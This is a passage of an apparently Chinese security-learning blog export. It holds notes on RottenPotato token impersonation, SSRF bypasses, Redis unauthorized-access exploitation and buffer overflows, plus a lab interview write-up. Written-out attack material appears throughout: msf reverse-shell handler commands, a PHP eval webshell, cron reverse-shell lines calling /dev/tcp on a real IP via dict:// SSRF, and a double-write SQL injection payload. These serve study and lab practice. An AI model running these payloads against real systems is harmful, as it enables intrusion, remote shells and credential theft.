<p>2上传并运行后门（大概率要做免杀）</p>
<p>3.msf开启监听（windows）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole  </span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost x.x.x.x  // 你设置监听的ip</span><br><span class="line">set lport xxx  // 你设置监听的端口</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>4.成功获取会话</p>
<p>5.incognito模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">伪造令牌：</span><br><span class="line">use incognito  #加载incognito模块</span><br><span class="line">list_tokens -u  #列出AccessToken</span><br><span class="line">getuid  #查看当前token</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;  #模拟system 用户，getsystem 命令，即实现了该命令。如果要模拟其他用户，将 token 名改为其他用户即可</span><br><span class="line"></span><br><span class="line">进程窃取令牌</span><br><span class="line">steal_token 1252  #从进程窃取token</span><br><span class="line">getsystem  #提升至system 权限</span><br><span class="line">rev2self  #返回到之前的AccessToken 权限</span><br></pre></td></tr></table></figure>

<h2 id="烂土豆提权（MS16-075）"><a href="#烂土豆提权（MS16-075）" class="headerlink" title="烂土豆提权（MS16-075）"></a><strong>烂土豆提权（MS16-075）</strong></h2><p>ms16-075漏洞介绍：</p>
<p>​		Windows SMB 服务器特权提升漏洞（CVE漏洞编号：CVE-2016-3225）当攻击者转发适用于在同一计算机上运行的其他服务的身份验证请求时，Microsoft 服务器消息块 (SMB) 中存在特权提升漏洞，成功利用此漏洞的攻击者可以使用提升的特权执行任意代码。若要利用此漏洞，攻击者首先必须登录系统。然后，攻击者可以运行一个为利用此漏洞而经特殊设计的应用程序，从而控制受影响的系统。此更新通过更正Windows服务器消息块 (SMB) 服务器处理凭据转发请求的方式来修复此漏洞。微软将其定义为KB3164038</p>
<p>RottenPotato（烂土豆）提权的原理可以简述如下：</p>
<p>1.欺骗“NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。</p>
<p>2.对这个认证过程使用中间人攻击（NTLM重放），为“NT AUTHORITY\SYSTEM”账户本地协商一个安全令牌。这个过程是通过一系列的Windows API调用实现的。</p>
<p>3.模仿这个令牌。只有具有“模仿安全令牌权限的账户才能去模仿别人的令牌。一般大多数的服务型账户（llS、MSSQL等）有这个权限，而大多数用户级的账户没有这个权限。</p>
<p>​		一般从web拿到的webshell都是IS服务器权限，是具有这个模仿权限的。测试过程中，使用已经建好的账户（就是上面说的用户级账户）去反弹meterpreter然后再去执行EXP的时候会失败，但使用莱刀（llS服务器权限）反弹meterpreter就会成功。</p>
<p>烂土豆比热土豆的优点是：<br>1.100%可靠<br>2.全版本通杀（<code>现在要做免杀</code>）<br>3.立即生效，不用像hot potato那样有时候需要等Windows更新才能使用。<br>        总之，我对这个的理解是通过中间人攻击，将COM（NT\SYSTEM权限）在第二步挑战应答过程中认证的区块改成自己的区块获取SYSTEM令牌，然后利用msf的模仿令牌功能模仿SYSTEM令牌。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.拿到webshell，上传烂土豆</span><br><span class="line"></span><br><span class="line">upload /root/potato.exe C:\Users\Public</span><br><span class="line"></span><br><span class="line">2.利用窃取模块列出AccessToken</span><br><span class="line"></span><br><span class="line">cd C:\\Users\\Public </span><br><span class="line"></span><br><span class="line">use incognito </span><br><span class="line"></span><br><span class="line">list_tokens -u</span><br><span class="line"></span><br><span class="line">3.执行烂土豆</span><br><span class="line"></span><br><span class="line">execute -cH -f ./potato.exe </span><br><span class="line"></span><br><span class="line">list_tokens -u </span><br><span class="line"></span><br><span class="line">impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</span><br><span class="line"></span><br><span class="line">4.窃取成功</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>参考文章：</p>
<p><a href="https://blog.csdn.net/qq_44159028/article/details/123429203">https://blog.csdn.net/qq_44159028/article/details/123429203</a></p>
<p><a href="https://blog.csdn.net/qq_44029310/article/details/126110570">https://blog.csdn.net/qq_44029310/article/details/126110570</a></p>
]]></content>
      <categories>
        <category>实验</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>ssrf总结</title>
    <url>/2023/03/06/ssrf%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a><strong>SSRF</strong></h2><p>SSRF是由一种攻击者构造请求，由服务器端发起请求的安全漏洞。一般情况下SSRF的攻击目标是<a href="https://so.csdn.net/so/search?q=%E5%A4%96%E7%BD%91&spm=1001.2101.3001.7020">外网</a>无法访问到的内部系统。（正因为请求是由服务器发起的，所以服务器端能请求到与自身相连而与外网隔离的内部系统。）</p>
<span id="more"></span>

<h2 id="形成原因"><a href="#形成原因" class="headerlink" title="形成原因"></a>形成原因</h2><p>SSRF的形成大多是由于服务端提供了从<strong>其他服务器</strong>应用获取数据的功能且没有对<strong>目标地址</strong>做<strong>过滤与限制。</strong></p>
<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>1.排除法：浏览器f12查看源代码看是否是在本地进行了请求</p>
<p>比如：该资源地址类型为 <a href="http://www.xxx.com/a.php?image=%EF%BC%88%E5%9C%B0%E5%9D%80%EF%BC%89%E7%9A%84%E5%B0%B1%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E">http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞</a></p>
<p>2.dnslog等工具进行测试，看是否被访问</p>
<p>–可以在盲打后台用例中将当前准备请求的uri 和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求。</p>
<p>3.抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址</p>
<p>–从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址</p>
<p>–通过二级域名暴力猜解工具模糊猜测内网地址</p>
<p>4.直接返回的Banner、title、content等信息</p>
<p>5.留意bool型SSRF</p>
<h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>1.让服务端去访问相应的网址</p>
<p>2.让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms</p>
<p>3.可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件</p>
<p>4.攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包{payload}）</p>
<p>5.攻击内网应用程序（利用跨协议通信技术）</p>
<p>6.判断内网主机是否存活：方法是访问看是否有端口开放</p>
<p>7.DoS攻击（请求大文件，始终保持连接keep-alive always）</p>
<h2 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h2><p>1.<a href="http://baidu.com@www.baidu.com/%E4%B8%8Ehttp://www.baidu.com/%E8%AF%B7%E6%B1%82%E6%97%B6%E6%98%AF%E7%9B%B8%E5%90%8C%E7%9A%84">http://baidu.com@www.baidu.com/与http://www.baidu.com/请求时是相同的</a></p>
<p>2.各种IP地址的进制转换</p>
<p>3.URL跳转绕过：<a href="http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/">http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/</a></p>
<p>4.短网址绕过 <a href="http://t.cn/RwbLKDx">http://t.cn/RwbLKDx</a></p>
<p>5.xip.io来绕过：<a href="http://xxx.192.168.0.1.xip.io/">http://xxx.192.168.0.1.xip.io/</a> &#x3D;&#x3D; 192.168.0.1 (xxx 任意）</p>
<p>指向任意ip的域名：xip.io(37signals开发实现的定制DNS服务)</p>
<p>6.限制了子网段，可以加 :80 端口绕过。<a href="http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80">http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80</a></p>
<p>7.探测内网域名，或者将自己的域名解析到内网ip</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>crontab -l 显示当前计划任务</p>
<p>crontab -r 清除当前计划任务</p>
<p>端口转发工具 socat</p>
<p>在Apache配置文件中写入下面的内容，就可以将jpg文件当做PHP文件来执行</p>
<p>AddType application&#x2F;x-httpd-php .jpg</p>
<p>参考文章：</p>
<p><a href="https://blog.csdn.net/ws1813004226/article/details/116885126">https://blog.csdn.net/ws1813004226/article/details/116885126</a></p>
<p><a href="https://xz.aliyun.com/t/2115">https://xz.aliyun.com/t/2115</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>ssrf</tag>
      </tags>
  </entry>
  <entry>
    <title>redis未授权总结</title>
    <url>/2023/03/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><ul>
<li>redis默认绑定在6379端口，即0.0.0.0:6379,且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。</li>
<li>没有设置密码认证（一般为空）或者设置弱口令密码，导致任何用户可以远程登录redis服务。</li>
<li>总的来说就是配置不当导致的漏洞：<ol>
<li>没有设置密码，或者设置密码为弱口令</li>
<li>没有开启防火墙</li>
<li>将6379端口直接暴露在公网上，允许任何人访问</li>
<li>将将protected-mode设置为no，把保护关掉。</li>
<li>用管理员身份运行redis服务</li>
</ol>
</li>
</ul>
<span id="more"></span>

<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><ol>
<li><p>写入SSH公钥实现ssh登录（要有ssh服务且有ssh公私钥认证）</p>
</li>
<li><p>利用webshell写入一句话木马（要有web服务）</p>
</li>
<li><p>设置延时任务反弹shell（要有写入权限）</p>
</li>
</ol>
<p>​	<strong>写入SSH公钥实现ssh登录</strong></p>
<p>​		</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa		###到~/.ssh目录下，生成自己的公钥</span><br><span class="line"></span><br><span class="line">(echo -e&quot;\n&quot;;cat id_rsa.pub;echo -e &quot;\n&quot;)&gt;1.txt		###将公钥写入一个txt文件</span><br><span class="line"></span><br><span class="line">cat 1.txt | ./redis-cli -h ip -p 6379 -x set hack		###将公钥中的内容作为值写入到hack中</span><br><span class="line"></span><br><span class="line">./redis-cli -h ip -p 6379	###连接redis服务</span><br><span class="line"></span><br><span class="line">config set dir /root/.ssh		###更改redis备份路径为ssh公钥存放目录</span><br><span class="line"></span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">save						</span><br><span class="line">exit	</span><br><span class="line">###设置上传公钥的备份文件名字为authorized_keys，保存，退出</span><br></pre></td></tr></table></figure>

<p>​	然后尝试在本机链接ssh</p>
<p>​	<code>ssh -i id_rsa root@ip</code></p>
<p>​	<strong>写入一句话木马</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dir /var/www/html/ </span><br><span class="line">config set  dbfilename shell.php </span><br><span class="line">set x &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot; </span><br><span class="line">或者：</span><br><span class="line">set shell &quot;\r\n\r\n&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;\r\n\r\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>​	<strong>延时任务反弹shell</strong></p>
<p>​	（前两种条件苛刻，这种要更好搞些，毕竟有未授权的redis权限一般都可以写入）</p>
<p>​		</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flushall     ###清空所有数据(打靶场随便，但实操的时候别这样，会导致删库，小心喝茶)</span><br><span class="line"></span><br><span class="line">config set dir /var/spool/cron/    ###利用config命令，设置要操作的路径为定时任务目录下</span><br><span class="line"></span><br><span class="line">config set dbfilename root	###建立定时任务文件为root</span><br><span class="line"></span><br><span class="line">set x &quot;\n * * * * * /bin/bash -i &gt;&amp; /dev/tcp/x.x.x.x/8888 0&gt;&amp;1\n&quot;	 ###/x.x.x.x/8888为自己的公网IP与监听端口，这里设置定时任务内容，开始和结束的\n是为了避免crontab的语法错误，五个*是每分钟执行一次</span><br><span class="line"></span><br><span class="line">save 保存操作，保存后就会执行注意提前设置监听</span><br><span class="line"></span><br><span class="line">###如果试ssrf+redis未授权利用用dict写shell时注意用bp抓包传输，同时注意数据包可能会打乱url编码和顺序，记得要把 `&amp;` URL 编码为 `%26`</span><br></pre></td></tr></table></figure>

<p>修复方案： </p>
<p>注意：以下操作，均需重启 Redis 后才能生效。 绑定需要访问数据库的 IP。 将 127.0.0.1 修改为需要访问此数据库的 IP 地址。 设置访问密码。在 Redis.conf 中 requirepass 字段后，设置添加访问密码。 修改 Redis 服务运行账号。以较低权限账号运行 Redis 服务，禁用账号的登录权限。</p>
<p>参考文章：</p>
<p><a href="https://blog.csdn.net/m0_47356348/article/details/125641104">https://blog.csdn.net/m0_47356348/article/details/125641104</a></p>
<p><a href="https://blog.csdn.net/qq_61237064/article/details/123006424">https://blog.csdn.net/qq_61237064/article/details/123006424</a></p>
<p><a href="https://xz.aliyun.com/t/9554">https://xz.aliyun.com/t/9554</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>记录一下面试打的靶场</title>
    <url>/2023/03/05/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E9%9D%A2%E8%AF%95%E6%89%93%E7%9A%84%E9%9D%B6%E5%9C%BA/</url>
    <content><![CDATA[<p>面试打靶场，时长三天，周五下午六点开始，干到半夜三点，周六一天脑子蒙的，熬夜真的巨难受（周四熬夜打群星，没想到周五面试又要熬夜QAQ），周六肝了一天什么思路都没有，晚上10点就睡了，睡了8，9个小时，周日起床一早上拿了三个flag，只能说熬夜不适合我。周日下午又来了一个面试，就不想打了。一共提交了4个flag不知道能不能过。</p>
<span id="more"></span>

<p>Web1 flag3</p>
<p>由页面与命令判断存在ssrf</p>
<p>​                   <img src="/2023/03/05/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E9%9D%A2%E8%AF%95%E6%89%93%E7%9A%84%E9%9D%B6%E5%9C%BA/image-20230305165915254.png" alt="image-20230305165915254">            </p>
<p> <img src="/2023/03/05/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E9%9D%A2%E8%AF%95%E6%89%93%E7%9A%84%E9%9D%B6%E5%9C%BA/image-20230305170002207.png" alt="image-20230305170002207"></p>
<p>得到ip: 172.19.240.5</p>
<p>尝试爆破c段</p>
<p> <img src="/2023/03/05/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E9%9D%A2%E8%AF%95%E6%89%93%E7%9A%84%E9%9D%B6%E5%9C%BA/image-20230305170015487.png" alt="image-20230305170015487"></p>
<p>1</p>
<p>5</p>
<p>7</p>
<p>本机：172.19.240.5</p>
<p>存活：</p>
<p>172.19.240.1 端口：6379，80</p>
<p>172.19.240.7 端口：6379</p>
<p>172.19.240.7思路：</p>
<p>6379为redis默认端口，试试未授权</p>
<p> <img src="/2023/03/05/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E9%9D%A2%E8%AF%95%E6%89%93%E7%9A%84%E9%9D%B6%E5%9C%BA/image-20230305170029354.png" alt="image-20230305170029354"></p>
<p>写入shell</p>
<p>dict:&#x2F;&#x2F;172.19.240.7:6379&#x2F;flushall </p>
<p>dict:&#x2F;&#x2F;172.19.240.7:6379&#x2F;config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F; </p>
<p>dict:&#x2F;&#x2F;172.19.240.7:6379&#x2F;config set dbfilename root</p>
<p>dict:&#x2F;&#x2F;172.19.240.7:6379&#x2F;set x “\n* * * * * &#x2F;bin&#x2F;bash -i &gt;%26 &#x2F;dev&#x2F;tcp&#x2F;39.106.17.48&#x2F;8888 0&gt;%261\n”</p>
<p>dict:&#x2F;&#x2F;172.19.240.7:6379&#x2F;save</p>
<p>设置监听 （想起来么有公网ip收不到回弹，于是去阿里云嫖了一个月的云服务器，真不错）</p>
<p><img src="/2023/03/05/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E9%9D%A2%E8%AF%95%E6%89%93%E7%9A%84%E9%9D%B6%E5%9C%BA/image-20230305170107998.png" alt="image-20230305170107998"></p>
<p>成功</p>
<p>Web1 flag2</p>
<p>收集信息</p>
<p>根据提示直接</p>
<p><strong>dict:&#x2F;&#x2F;172.19.240.7:6379&#x2F;get flag</strong></p>
<p><img src="/2023/03/05/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E9%9D%A2%E8%AF%95%E6%89%93%E7%9A%84%E9%9D%B6%E5%9C%BA/image-20230305170153443.png" alt="image-20230305170153443"></p>
<h2 id="Web1-FLAG1"><a href="#Web1-FLAG1" class="headerlink" title="Web1-FLAG1"></a>Web1-FLAG1</h2><h2 id><a href="#" class="headerlink" title></a></h2><h2 id="-1"><a href="#-1" class="headerlink" title></a></h2><p>Web5-FLAG1</p>
<p> <img src="/2023/03/05/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E9%9D%A2%E8%AF%95%E6%89%93%E7%9A%84%E9%9D%B6%E5%9C%BA/image-20230305170202200.png" alt="image-20230305170202200"></p>
<p>Web5-FLAG1</p>
<p>7kbscan扫出302</p>
<p><a href="http://43.137.0.21:8082/admin/login.php">http://43.137.0.21:8082/admin/login.php</a></p>
<p>得到登录页面</p>
<p> <img src="/2023/03/05/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E9%9D%A2%E8%AF%95%E6%89%93%E7%9A%84%E9%9D%B6%E5%9C%BA/image-20230305170251168.png" alt="image-20230305170251168"></p>
<p>尝试弱密码</p>
<p>失败</p>
<p>爆破</p>
<p>失败</p>
<p>Sql注入</p>
<p>有报错，有过滤</p>
<p>双写绕过</p>
<p>尝试写入shell</p>
<p>失败</p>
<p>Ini中限制文件写入</p>
<p> <img src="/2023/03/05/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E9%9D%A2%E8%AF%95%E6%89%93%E7%9A%84%E9%9D%B6%E5%9C%BA/image-20230305170258216.png" alt="image-20230305170258216"></p>
<p>根据报错编写</p>
<p>admin’ an and d extractvalue(1,concat(0x7e,(selselectect admin_name fro from m bees_admin limit 0,1),0x7e))#</p>
<p>拿到</p>
<p>账户：meetsec</p>
<p>Cmd5解密</p>
<p>密码：login123</p>
<p>登录</p>
<p> <img src="/2023/03/05/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E9%9D%A2%E8%AF%95%E6%89%93%E7%9A%84%E9%9D%B6%E5%9C%BA/image-20230305170305760.png" alt="image-20230305170305760"></p>
<p> <img src="/2023/03/05/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E9%9D%A2%E8%AF%95%E6%89%93%E7%9A%84%E9%9D%B6%E5%9C%BA/image-20230305170310168.png" alt="image-20230305170310168"></p>
<p>发现有上传</p>
<p>尝试</p>
<p><a href="http://43.137.0.21:8082/admin/admin_file_upload.php">http://43.137.0.21:8082/admin/admin_file_upload.php</a> <a href="http://43.137.0.21:8082/admin/upload.php">http://43.137.0.21:8082/admin/upload.php</a></p>
<p> <img src="/2023/03/05/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E9%9D%A2%E8%AF%95%E6%89%93%E7%9A%84%E9%9D%B6%E5%9C%BA/image-20230305170316675.png" alt="image-20230305170316675"></p>
<p> <img src="/2023/03/05/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E9%9D%A2%E8%AF%95%E6%89%93%E7%9A%84%E9%9D%B6%E5%9C%BA/image-20230305170322139.png" alt="image-20230305170322139"></p>
<p>application&#x2F;x-zip-compressed</p>
<p>不知道为什么后面可以直接传php了</p>
<p>于是传一句话</p>
<p>蚁剑连接</p>
<p> <img src="/2023/03/05/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E9%9D%A2%E8%AF%95%E6%89%93%E7%9A%84%E9%9D%B6%E5%9C%BA/image-20230305170326203.png" alt="image-20230305170326203"></p>
<p>Getflag</p>
<h2 id="Web6-FLAG1"><a href="#Web6-FLAG1" class="headerlink" title="Web6-FLAG1"></a>Web6-FLAG1</h2><p><img src="/2023/03/05/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%E9%9D%A2%E8%AF%95%E6%89%93%E7%9A%84%E9%9D%B6%E5%9C%BA/image-20230305170342495.png" alt="image-20230305170342495"></p>
<p>是一个tomcat10，扫了一下是个登录框，试了一下弱口令，不行，肝不动了，结束打靶场</p>
]]></content>
      <categories>
        <category>实验</category>
      </categories>
      <tags>
        <tag>随笔</tag>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>如何理解溢出漏洞</title>
    <url>/2023/03/01/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="如何理解缓冲区溢出？"><a href="#如何理解缓冲区溢出？" class="headerlink" title="如何理解缓冲区溢出？"></a>如何理解缓冲区溢出？</h2><p><strong>缓冲区溢出</strong>（buffer overflow），在<a href="https://zh.wikipedia.org/wiki/%E9%9B%BB%E8%85%A6%E5%AD%B8">电脑学</a>上是指针对<a href="https://zh.wikipedia.org/wiki/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1">程序设计</a>缺陷，向程序输入<a href="https://zh.wikipedia.org/wiki/%E7%BC%93%E5%86%B2%E5%8C%BA">缓冲区</a>写入使之溢出的内容（通常是超过缓冲区能保存的最大数据量的数据），从而破坏程序运行、趁著中断之际并取得程序乃至系统的控制权。</p>
<span id="more"></span>

<p>缓冲区溢出原指当某个数据超过了处理程序回传<a href="https://zh.wikipedia.org/wiki/%E5%A0%86%E7%96%8A">堆叠</a>位址限制的范围时，程序出现的异常操作。造成此现象的原因有：</p>
<ul>
<li>存在<a href="https://zh.wikipedia.org/wiki/%E7%A8%8B%E5%BA%8F%E9%94%99%E8%AF%AF">缺陷的程序设计</a></li>
<li>尤其是<a href="https://zh.wikipedia.org/wiki/C%E8%AF%AD%E8%A8%80">C语言</a>，不像其他一些<a href="https://zh.wikipedia.org/wiki/%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80">高级语言</a>会自动进行数组或者指针的堆叠区块<a href="https://zh.wikipedia.org/wiki/%E8%BE%B9%E7%95%8C%E6%A3%80%E6%9F%A5">边界检查</a>，增加溢出风险。</li>
<li>C语言中的<a href="https://zh.wikipedia.org/wiki/C%E6%A0%87%E5%87%86%E5%BA%93">C标准库</a>还具有一些非常危险的操作函数，使用不当也为溢出创造条件。</li>
</ul>
<p>​		计算机程序一般都会使用到一些内存，这些内存或是程序内部使用，或是存放用户的输入数据，这样的内存一般称作缓冲区。溢出是指盛放的东西超出容器容量而溢出来了，在计算机程序中，就是数据使用到了被分配内存空间之外的内存空间。而缓冲区溢出，简单的说就是计算机对接收的输入数据没有进行有效的检测（理想的情况是程序检查数据长度并不允许输入超过缓冲区长度的字符），向缓冲区内填充数据时超过了缓冲区本身的容量，而导致数据溢出到被分配空间之外的内存空间，使得溢出的数据覆盖了其他内存空间的数据。</p>
<h2 id="什么是溢出漏洞？"><a href="#什么是溢出漏洞？" class="headerlink" title="什么是溢出漏洞？"></a>什么是溢出漏洞？</h2><p>​		具体的讲，溢出漏洞是由于程序中的某个或某些输入<a href="https://baike.baidu.com/item/%E5%87%BD%E6%95%B0?fromModule=lemma_inlink">函数</a>（使用者输入参数）对所接收数据的边界验证不严密而造成。</p>
<p>​		根据程序执行中<a href="https://baike.baidu.com/item/%E5%A0%86%E6%A0%88?fromModule=lemma_inlink">堆栈</a>调用原理，程序对超出边界的部分如果没有经过验证自动去掉，那么超出边界的部分就会覆盖后面的存放程序<a href="https://baike.baidu.com/item/%E6%8C%87%E9%92%88?fromModule=lemma_inlink">指针</a>的数据，当执行完上面的代码，程序会自动调用指针所指向地址的命令。</p>
<p>​		根据这个原理，恶意使用者就可以构造出溢出<a href="https://baike.baidu.com/item/%E7%A8%8B%E5%BA%8F/71525?fromModule=lemma_inlink">程序</a>。</p>
<h2 id="溢出原理"><a href="#溢出原理" class="headerlink" title="溢出原理"></a><strong>溢出原理</strong></h2><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta">#include “stdafx.h”</span></span><br><span class="line"><span class="meta">#include “string.h”</span></span><br><span class="line"><span class="meta">#include “stdio.h”</span></span><br><span class="line"><span class="built_in">char</span> buf[<span class="number">255</span>],pass[<span class="number">4</span>]; <span class="comment">/*声明变量，让计算机分配指定的内存*/</span></span><br><span class="line"><span class="function"><span class="built_in">int</span> <span class="title">main</span> (<span class="params"><span class="built_in">int</span> argc,<span class="built_in">char</span>* argv[ ]</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">printf（“请输入您的密码：”）; <span class="comment">/*指定输出的字符*/</span></span><br><span class="line">scanf(%s,buf)； <span class="comment">/*输入一个字符串，保存在变量buf中*/</span></span><br><span class="line">strcpy(pass,buf); <span class="comment">/*把字符串buf中的字符串复制到变量pass中*/</span></span><br><span class="line"><span class="keyword">if</span> (strcmp(pass，”wlqs”）= =<span class="number">0</span>) <span class="comment">/*比较输入的字符串是否为密码*/</span></span><br><span class="line">printf （“输入正确！”）；</span><br><span class="line"><span class="keyword">else</span> printf（“输入错误！）；</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​		这是一段密码验证程序，与我们平时输入密码一样，先让用户输入密码，然后在取得真正的密码，与之对比，如果差异为0，则输出密码正确，否则输出密码错误。</p>
<p>​		漏洞很容易就看出来了。那就是它给数据申请了4个字节的储存空间，但是万一用户输入的数据不只4个字节，那么剩余的字节存放在哪里？</p>
<p>  <img src="/2023/03/01/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20230302133853100.png" alt="image-20230302133853100"></p>
<p>​		举个例子，有一条一米长的木头，有一张红色纸条从尾巴往头贴，上面写有字，然后又有一张蓝色纸条，上面也写有字，要从木头的头往它的尾巴贴，但是贴了红色纸条过后只剩4cm的长度，贴完后会有人读出后面96cm的字，并且执行字条的命令，但是蓝色纸条却有10cm的长度，怎么办呢？</p>
<p>​		只有把蓝色纸条剩下的部分贴在红色纸条上了。那么红色纸条的一些字就被覆盖了。但是那个人还是会去读那后面96cm的字，所以他就只有读错，前面读的都是蓝色字条的字。先前去执行的是蓝色字条后面6cm的命令。</p>
<p>​		其他剩下的字符将溢出！剩下的数字将占用内存空间，那么系统执行命令的时候将会执行占用内存的数据，而不是执行原先写好的命令了！这些数字系统根本就读不懂，如何执行？那么它只好报错了！说此程序遇到问题需要关闭。那么计算机上的程序将出错而无法执行或关闭。</p>
<p>​		利用这样的溢出漏洞可以关闭很多程序，比如各学校机房里安装的那些<a href="https://baike.baidu.com/item/%E8%BF%9C%E7%A8%8B%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F?fromModule=lemma_inlink">远程教育系统</a>，学生的计算机被教师的计算机所控制是因为学生机上安装有一个学生端程序，教师机可以通过教师端来对学生端进行远程控制，学生端没有退出功能，学生所在的用户组也没有强行结束进程的权限，当学生不想被老师控制的时候，可以打开学生端自带的远程消息功能，在消息里输入很长的数据，比如几百上千句“敢控制我！看我不宰了你！”，然后发送，就可以令学生端程序出错而被系统强行关闭。这招对某些网吧的收费系统也有用。</p>
<p>​		当然，随便往<a href="https://baike.baidu.com/item/%E7%BC%93%E5%86%B2%E5%8C%BA?fromModule=lemma_inlink">缓冲区</a>中填东西造成它溢出一般只会出现“分段错误”（Segmentation fault），而不能达到攻击的目的。</p>
<p>​		最常见的攻击手段是通过制造<a href="https://baike.baidu.com/item/%E7%BC%93%E5%86%B2%E5%8C%BA?fromModule=lemma_inlink">缓冲区</a>溢出使程序运行一个用户shell，再通过shell执行其它命令。如果该程序有root或者suid执行权限的话，攻击者就获得了一个有<a href="https://baike.baidu.com/item/root%E6%9D%83%E9%99%90?fromModule=lemma_inlink">root权限</a>的shell，可以对系统进行任意操作了。</p>
<p>​		例如，如果内存中的被覆盖部分包含一个指针（指向内存中另一个位置的对象），则攻击者的代码可以用另一个指向漏洞利用有效载荷的指针来替换该代码。这样就可以将整个程序的控制权转移给攻击者的代码。</p>
<h2 id="技术特点"><a href="#技术特点" class="headerlink" title="技术特点"></a>技术特点</h2><p>​		人为的溢出是有一定企图的，攻击者写一个超过缓冲区长度的字符串，植入到缓冲区这时可能会出现两种结果：一是过长的字符串覆盖了相邻的存储单元，引起程序运行失败，严重的可导致系统崩溃；另一个结果就是利用这种漏洞可以执行任意指令，甚至可以取得系统root特级权限。</p>
<p><strong><code>C 和 C++ 是两种脆弱性较高的热门语言，因为它们不包含内置的保护措施以防止访问或覆盖内存中的数据</code>。</strong></p>
